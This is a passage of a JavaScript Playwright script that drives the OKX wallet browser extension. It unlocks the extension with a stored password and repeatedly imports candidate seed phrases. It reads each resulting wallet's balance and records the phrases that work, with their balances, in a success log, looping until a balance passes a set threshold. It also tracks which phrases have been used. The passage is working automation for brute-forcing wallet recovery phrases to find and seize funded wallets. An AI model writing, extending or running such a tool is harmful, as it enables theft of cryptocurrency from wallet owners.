	const hasNetworkUnavailable = await scope
		.getByText(/Network unavailable|No internet connection|Network error/i)
		.first()
		.isVisible()
		.catch(() => false);

	if (!hasNetworkUnavailable) {
		return false;
	}

	const now = Date.now();
	if (now - lastNetworkRecoveryAt < 1500) {
		return true;
	}
	lastNetworkRecoveryAt = now;

	const tryAgainButton = scope.getByRole("button", { name: /Try again/i }).first();
	if ((await tryAgainButton.count().catch(() => 0)) > 0) {
		const isEnabled = await tryAgainButton.isEnabled().catch(() => true);
		if (isEnabled) {
			await tryAgainButton.click({ timeout: 1200 }).catch(() => {});
			console.log("Network unavailable detected. Clicked Try again.");
		}
	}

	if (ownerPage && !ownerPage.isClosed()) {
		await ownerPage.reload({ waitUntil: "domcontentloaded" }).catch(() => {});
		await ownerPage.bringToFront().catch(() => {});
		console.log("Network unavailable persisted. Reloaded page.");
	}

	return true;
}

async function waitForBalanceAndLog(browser) {
	const balanceSelector = '[data-testid="home-page-total-assets-balance-wrapper"]';
	const buildProbeList = () => {
		const probes = [];

		if (lastBalanceProbe?.page && !lastBalanceProbe.page.isClosed()) {
			if (Number.isInteger(lastBalanceProbe.frameIndex) && lastBalanceProbe.frameIndex >= 0) {
				probes.push({ page: lastBalanceProbe.page, frameIndex: lastBalanceProbe.frameIndex });
			} else {
				probes.push({ page: lastBalanceProbe.page, frameIndex: -1 });
			}
		}

		for (const context of browser.contexts()) {
			for (const page of context.pages()) {
				if (page.isClosed()) {
					continue;
				}

				probes.push({ page, frameIndex: -1 });
				const frames = page.frames();
				for (let frameIndex = 0; frameIndex < frames.length; frameIndex += 1) {
					probes.push({ page, frameIndex });
				}
			}
		}

		const deduped = [];
		const seen = new Set();
		for (const probe of probes) {
			const key = `${probe.page.url()}::${probe.frameIndex}`;
			if (!seen.has(key)) {
				seen.add(key);
				deduped.push(probe);
			}
		}

		return deduped;
	};

	const parseNumericBalance = (text) => {
		const normalized = (text || "").replace(/\s+/g, " ").trim();
		if (!normalized || normalized === "--" || normalized.toLowerCase() === "loading") {
			return null;
		}

		const match = normalized.match(/[\$€£¥]\s*\d[\d,]*(?:\.\d+)?|\b\d[\d,]*(?:\.\d+)?\b/);
		if (!match || !match[0]) {
			return null;
		}

		const display = match[0].trim();
		const numericText = display.replace(/[^\d.]/g, "");
		const amount = Number.parseFloat(numericText);
		if (!Number.isFinite(amount)) {
			return null;
		}

		return { display, amount };
	};

	let idleRounds = 0;
	while (true) {
		const probes = buildProbeList();
		for (const probe of probes) {
			const { page, frameIndex } = probe;
			if (page.isClosed()) {
				continue;
			}

			const target = frameIndex >= 0 ? page.frames()[frameIndex] : page;
			if (!target) {
				continue;
			}

			await dismissTonImportWarningIfPresent(target).catch(() => false);
			await recoverFromNetworkUnavailableIfPresent(target, page).catch(() => false);

			const rawBalance = await target
				.evaluate((selector) => {
					const wrapper = document.querySelector(selector);
					if (!wrapper) {
						return null;
					}

					return (wrapper.textContent || "").replace(/\s+/g, " ").trim();
				}, balanceSelector)
				.catch(() => null);

			const parsedBalance = parseNumericBalance(rawBalance);
			if (parsedBalance) {
				lastBalanceProbe = probe;
				console.log(`Balance detected: ${parsedBalance.display}`);
				return parsedBalance;
			}
		}

		idleRounds += 1;
		const waitMs = ULTRA_FAST_MODE
			? Math.min(90, 8 + idleRounds * 8)
			: Math.min(160, 20 + idleRounds * 15);
		await delay(waitMs);
	}
}

async function waitForImportScreen(page, timeoutMs = 15000) {
	const inputSelector =
		'input[data-testid="import-seed-phrase-or-private-key-page-seed-phrase-input"], input.mnemonic-words-inputs__container__input';
	await page.waitForLoadState("domcontentloaded").catch(() => {});

	while (true) {
		await recoverFromNetworkUnavailableIfPresent(page, page).catch(() => false);

		const hasTitle = await page
			.locator("text=Seed phrase or private key")
			.first()
			.isVisible()
			.catch(() => false);
		const inputCount = await page.locator(inputSelector).count().catch(() => 0);

		if (hasTitle || inputCount >= Math.min(getActiveWordCount(), 12)) {
			return true;
		}

		for (const frame of page.frames()) {
			await recoverFromNetworkUnavailableIfPresent(frame, page).catch(() => false);

			const frameTitleVisible = await frame
				.getByText(/Seed phrase or private key/i)
				.first()
				.isVisible()
				.catch(() => false);
			const frameInputCount = await frame.locator(inputSelector).count().catch(() => 0);

			if (frameTitleVisible || frameInputCount >= Math.min(getActiveWordCount(), 12)) {
				return true;
			}
		}

		await page.bringToFront().catch(() => {});
		await delay(10); // minimal delay for max speed
	}
}

async function detectOkxScreenState(page) {
	const passwordSelector = [
		'input[data-testid="okd-input"][type="password"]',
		'input[type="password"][placeholder*="Enter your password"]',
		'input.okui-input-input[type="password"]',
	].join(", ");
	const inputSelector =
		'input[data-testid="import-seed-phrase-or-private-key-page-seed-phrase-input"], input.mnemonic-words-inputs__container__input';

	await page.waitForLoadState("domcontentloaded").catch(() => {});

	const pagePasswordVisible = await page
		.locator(passwordSelector)
		.first()
		.isVisible()
		.catch(() => false);
	if (pagePasswordVisible) {
		return { type: "password", ownerPage: page };
	}

	const pageSeedCount = await page.locator(inputSelector).count().catch(() => 0);
	if (pageSeedCount >= Math.min(getActiveWordCount(), 12)) {
		return { type: "seed", ownerPage: page };
	}

	for (const frame of page.frames()) {
		const framePasswordVisible = await frame
			.locator(passwordSelector)
			.first()
			.isVisible()
			.catch(() => false);
		if (framePasswordVisible) {
			return { type: "password", ownerPage: page };
		}

		const frameSeedCount = await frame.locator(inputSelector).count().catch(() => 0);
		if (frameSeedCount >= Math.min(getActiveWordCount(), 12)) {
			return { type: "seed", ownerPage: page };
		}
	}

	return { type: "unknown", ownerPage: page };
}

async function ensureReadyForSeedPhrase(page, url) {
	let activePage = page;

	for (let pass = 1; pass <= SCREEN_STATE_RECHECK_ATTEMPTS; pass += 1) {
		const state = await detectOkxScreenState(activePage);

		if (state.type === "seed") {
			await activePage.bringToFront().catch(() => {});
			return activePage;
		}

		if (state.type === "password") {
			activePage = await handleOkxPasswordGateIfPresent(activePage, url);
			continue;
		}

		await recoverFromNetworkUnavailableIfPresent(activePage, activePage).catch(() => false);

		if (pass < SCREEN_STATE_RECHECK_ATTEMPTS) {
			await activePage.bringToFront().catch(() => {});
			await delay(speedMs(SCREEN_STATE_RECHECK_DELAY_MS, 24));
			continue;
		}

		await activePage.goto(url, { waitUntil: "domcontentloaded" }).catch(() => {});
		activePage = await handleOkxPasswordGateIfPresent(activePage, url);
	}

	const ready = await waitForImportScreen(activePage, 6000);
	if (ready) {
		return activePage;
	}

	throw new Error("Could not reach seed phrase import screen after state recovery.");
}

async function getOrCreateTargetPage(browser, url) {
	const primaryContext = browser.contexts()[0] || (await browser.newContext());
	const targetPage = await primaryContext.newPage();
	if (ULTRA_FAST_MODE) {
		targetPage.setDefaultTimeout(2600);
		targetPage.setDefaultNavigationTimeout(3800);
	}
	await targetPage.goto(url, { waitUntil: "domcontentloaded" });

	await targetPage.bringToFront().catch(() => {});
	await delay(1); // minimal delay for max speed

	// Close all other tabs except the new one
	for (const context of browser.contexts()) {
		for (const page of context.pages()) {
			if (page !== targetPage && !page.isClosed()) {
				try {
					await page.close({ runBeforeUnload: true });
				} catch {
					// Ignore tab close races.
				}
			}
		}
	}

	return targetPage;
}

async function findOkxPasswordGate(page) {
	const passwordSelector = [
		'input[data-testid="okd-input"][type="password"]',
		'input[type="password"][placeholder*="Enter your password"]',
		'input.okui-input-input[type="password"]',
	].join(", ");

	const pageInput = page.locator(passwordSelector).first();
	const pageVisible = await pageInput.isVisible().catch(() => false);
	if (pageVisible) {
		return { scope: page, ownerPage: page, input: pageInput };
	}

	for (const frame of page.frames()) {
		const frameInput = frame.locator(passwordSelector).first();
		const frameVisible = await frameInput.isVisible().catch(() => false);
		if (frameVisible) {
			return { scope: frame, ownerPage: page, input: frameInput };
		}
	}

	return null;
}

async function fillOkxPasswordInput(input, password) {
	await input.fill(password).catch(async () => {
		await input.click({ timeout: 1500 }).catch(() => {});
		await input.press("Control+a").catch(() => {});
		await input.type(password, { delay: 0 }).catch(() => {});
	});

	let currentValue = await input.inputValue().catch(() => "");
	if (currentValue !== password) {
		await input.evaluate((element, value) => {
			const nativeInputValueSetter =
				Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")?.set;
			nativeInputValueSetter?.call(element, value);
			element.dispatchEvent(new Event("input", { bubbles: true }));
			element.dispatchEvent(new Event("change", { bubbles: true }));
			element.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true, key: "4" }));
			element.dispatchEvent(new Event("blur", { bubbles: true }));
		}, password);
	}

	currentValue = await input.inputValue().catch(() => "");
	return currentValue === password;
}

async function waitForUnlockEnabled(scope, timeoutMs = 5000) {
	const buttonLocator = scope
		.locator('button[data-testid="okd-button"]:has-text("Unlock")')
		.first();

	const start = Date.now();
	while (Date.now() - start < timeoutMs) {
		if ((await buttonLocator.count().catch(() => 0)) > 0) {
			const enabled = await buttonLocator
				.evaluate((button) => {
					const disabledAttr = button.hasAttribute("disabled");
					const ariaDisabled = button.getAttribute("aria-disabled") === "true";
					return !disabledAttr && !ariaDisabled;
				})
				.catch(() => false);

			if (enabled) {
				return buttonLocator;
			}
		}

		await delay(speedMs(100, 16));
	}

	return null;
}

async function handleOkxPasswordGateIfPresent(page, url) {
	await page.waitForLoadState("domcontentloaded").catch(() => {});
	const gate = await findOkxPasswordGate(page);
	if (!gate) {
		return page;
	}

	const { scope, ownerPage, input } = gate;
	await ownerPage.bringToFront().catch(() => {});

	const passwordFilled = await fillOkxPasswordInput(input, OKX_PASSWORD_AUTOFILL);
	if (!passwordFilled) {
		throw new Error("OKX password field found but could not set password value.");
	}

	const unlockButton = scope
		.getByRole("button", { name: /unlock|confirm|continue|log in|login/i })
		.first();

	const enabledUnlock = await waitForUnlockEnabled(scope, 6000);
	if (enabledUnlock) {
		await enabledUnlock.click({ timeout: 2500 }).catch(() => {});
	} else {
		const buttonVisible = await unlockButton.isVisible().catch(() => false);
		if (buttonVisible) {
			const buttonEnabled = await unlockButton.isEnabled().catch(() => true);
			if (buttonEnabled) {
				await unlockButton.click({ timeout: 2000 }).catch(() => {});
			} else {
				await input.press("Enter").catch(() => {});
			}
		} else {
			await input.press("Enter").catch(() => {});
		}
	}

	console.log(
		`OKX password screen detected. Waiting up to ${OKX_PASSWORD_WAIT_MS}ms for unlock transition.`
	);

	const unlockStart = Date.now();
	let gateClosed = false;
	while (Date.now() - unlockStart < OKX_PASSWORD_WAIT_MS) {
		const stillVisible = await input.isVisible().catch(() => false);
		if (!stillVisible) {
			gateClosed = true;
			break;
		}

		await delay(speedMs(120, 20));
	}

	if (!gateClosed) {
		await ownerPage.goto(url, { waitUntil: "domcontentloaded" }).catch(async () => {
			await ownerPage.goto(url).catch(() => {});
		});
	}

	await ownerPage.bringToFront().catch(() => {});
	console.log("Reused current OKX tab after unlock step.");
	return ownerPage;
}

async function main() {
	const overallStart = Date.now();
	await ensureCdp(targetUrl);

	const browser = await chromium.connectOverCDP(CDP_ENDPOINT);

	let stopWatcher = null;
	try {
		console.log(
			`Mode: ${ULTRA_FAST_MODE ? "ULTRA_FAST" : "NORMAL"} | speedFactor=${SPEED_FACTOR}`
		);
		// Always create a new tab for password screen
		let page = await getOrCreateTargetPage(browser, targetUrl);
		await handleOkxPasswordGateIfPresent(page, targetUrl);

		// Always create a new tab for import screen after password
		page = await getOrCreateTargetPage(browser, targetUrl);

		// Start the screen watcher in background (pass browser)
		stopWatcher = startScreenWatcher(browser, targetUrl);

		await page.bringToFront();
		await delay(1);

		const importScreenTimeoutMs = speedMs(15000, 3500);
		const hasImportPageTitle = await waitForImportScreen(page, importScreenTimeoutMs);
		if (!hasImportPageTitle) {
			throw new Error("OKX import screen not visible.");
		}

		const attemptResult = await fillAndConfirmWithRetries(page, { startAttempt: 1 });
		const balance = await waitForBalanceAndLog(browser);

		const totalTime = Date.now() - overallStart;
		return {
			balance,
			attemptResult,
			totalTimeMs: totalTime,
		};
	} finally {
		if (stopWatcher) stopWatcher();
		await browser.close();
	}
}

async function startLoopUntilFailure() {
	let runNumber = 1;
	let sessionSuccessfulTimeMs = 0;

	while (true) {
		try {
			console.log(`Starting run #${runNumber}...`);

			const result = await main();
			appendSuccessHistory({
				runNumber,
				timestamp: new Date().toISOString(),
				phrase: result.attemptResult.phrase,
				phraseAttempt: result.attemptResult.attempt,
				balanceDisplay: result.balance.display,
				balanceAmount: result.balance.amount,
				totalTimeMs: result.totalTimeMs,
			});

			console.log(
				`Run #${runNumber} success | balance: ${result.balance.display} | saved: ${SUCCESS_SQL_PATH}`
			);
			sessionSuccessfulTimeMs += Number(result.totalTimeMs) || 0;
			console.log(
				`Run #${runNumber} total time: ${formatDurationHms(result.totalTimeMs)} (${result.totalTimeMs}ms) | session total: ${formatDurationHms(sessionSuccessfulTimeMs)} (${sessionSuccessfulTimeMs}ms)`
			);

			if (result.balance.amount >= BALANCE_STOP_THRESHOLD) {
				console.log(
					`Stop: balance ${result.balance.display} reached threshold ${BALANCE_STOP_THRESHOLD}`
				);
				break;
			}

			runNumber += 1;
		} catch (error) {
			console.error(`Automation failed on run #${runNumber}:`, error.message || error);
			break;
		}
	}

	persistUsedPhrases({ force: true });
}

async function bootstrap() {
	await chooseWordCountForRun();
	await startLoopUntilFailure();
}

bootstrap().catch((error) => {
	console.error("Unexpected launcher failure:", error.message || error);
	process.exit(1);
});
